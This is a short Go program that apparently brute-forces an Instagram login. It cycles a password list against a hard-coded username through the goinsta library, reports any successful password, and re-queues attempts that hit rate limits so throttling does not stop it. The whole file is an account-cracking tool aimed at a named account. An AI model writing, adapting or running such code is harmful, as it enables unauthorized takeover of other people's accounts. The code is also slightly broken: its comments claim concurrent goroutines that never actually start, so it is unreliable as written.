package main

import (
	"fmt"
	"strings"
	"sync"

	"github.com/ahmdrz/goinsta"
)

var wg sync.WaitGroup

var username string = "peterc.exe"
var passwords []string
var cracked bool = false

func main() {
  passwords = []string{"123", "456", "123", "456", "123", "456", "123", "456", "123", "456", "123", "456"}

  for len(passwords) > 0 && !cracked {
    // Begin the cracking process
    crack()

  	// Wait for all goroutines to complete
  	wg.Wait()

    fmt.Println("COMPLETED CRACKING ROUND! PASSWORDS LEFT:", len(passwords))
  }
}

func crack()  {
  // Increment through username and password lists
	for len(passwords) > 0 && !cracked {

		// Add a task to the WaitGroup
		wg.Add(1)

    // Pop a password off the slice
		pass := passwords[len(passwords) - 1]
    passwords = passwords[:len(passwords) - 1]

		// Spawn a new thread to crack the account
		func(p string) {

			// Defer WaitGroup completion
			defer wg.Done()

			// Test login informaton
			result := login(username, p)
			if result == 0 {
				fmt.Println(username + ":" + p, "worked!")
			} else if result == 2 {
				// Rate limit error. Push password back onto the stack.
				passwords = append(passwords, p)
			}
		} (pass) // Pass login info to goroutine
	}
}

/*
   Attempt to login to instagram account
   Returns 1 for failure, 0 for success
*/
func login(user string, pass string) int {
	insta := goinsta.New(user, pass)

	if err := insta.Login(); err != nil {
		fmt.Println("Failed to login with", user+":"+pass)
		fmt.Println("Error:\n", err)
		if strings.Contains(err.Error(), "rate_limit_error") {
			return 2
		}
		return 1
	}

	defer insta.Logout()

  cracked = true
	return 0
}
